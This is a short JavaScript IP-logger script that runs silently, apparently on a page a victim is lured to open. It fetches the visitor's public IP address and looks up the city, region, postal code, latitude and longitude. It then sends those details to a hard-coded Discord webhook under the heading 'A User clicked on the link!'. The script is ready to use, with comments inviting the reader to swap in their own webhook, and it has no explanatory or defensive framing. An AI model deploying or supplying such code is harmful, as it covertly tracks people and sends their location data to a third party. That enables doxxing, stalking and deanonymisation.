const sendIP = () => {
    fetch('https://api.ipify.org?format=json')
        .then(ipResponse => ipResponse.json())
        .then(ipData => {
            const ipadd = ipData.ip;
            return fetch(`https://ipapi.co/${ipadd}/json/`)
                .then(geoResponse => geoResponse.json())
                .then(geoData => {
                    const dscURL = 'https://discord.com/api/webhooks/1410930902707601418/OL94ZgkySxNkxbaP0EfYkVRaOiNIPgnTOemhhqlHmn6n3Uj7oqlpHaB8MXuzbHaPHe9m'; // replace with your webhook url
                    return fetch(dscURL, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            username: "Glem bot", // optionally changeable
                            avatar_url: "https://t4.ftcdn.net/jpg/00/10/29/99/360_F_10299968_1z4xdoUIBgeQ4GVKqsf1sg9sot3Qe6RV.jpg", // optionally changeable
                            content: `@here`,
                            embeds: [
                                {
                                    title: 'A User clicked on the link!',
                                    description: `**IP Address >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                    color: 0x800080 // optionally changeable
                                }
                            ]
                        })
                    });
                });
        })
        .then(dscResponse => {  
            if (dscResponse.ok) {
                console.log('Sent! <3');
            } else {
                console.log('Failed :(');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            console.log('Error :(');
        });
};
sendIP();

